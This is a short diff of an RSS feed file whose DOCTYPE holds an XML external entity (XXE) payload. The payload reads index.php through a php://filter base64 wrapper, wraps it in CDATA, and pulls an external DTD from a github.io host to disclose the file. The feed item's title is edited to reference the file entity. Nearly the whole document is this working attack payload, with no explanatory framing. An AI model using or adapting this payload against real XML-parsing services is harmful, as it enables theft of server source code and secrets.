@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE channel [
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
   <!ENTITY % start "<![CDATA[">
   <!ENTITY % end "]]>">
   <!ENTITY % dtd SYSTEM "https://slavalaki.github.io/join.dtd">
@@ -13,7 +13,7 @@
     <description>Links for the intellectually curious</description>
 
     <item>
-      <title>&all;</title>
+      <title>&file;</title>
       <link>https://oxide.computer/blog/our-100m-series-b</link>
       <description>Our $100M Series B announcement</description>
       <pubDate>Wed, 30 Jul 2025 13:17:28 +0000</pubDate>
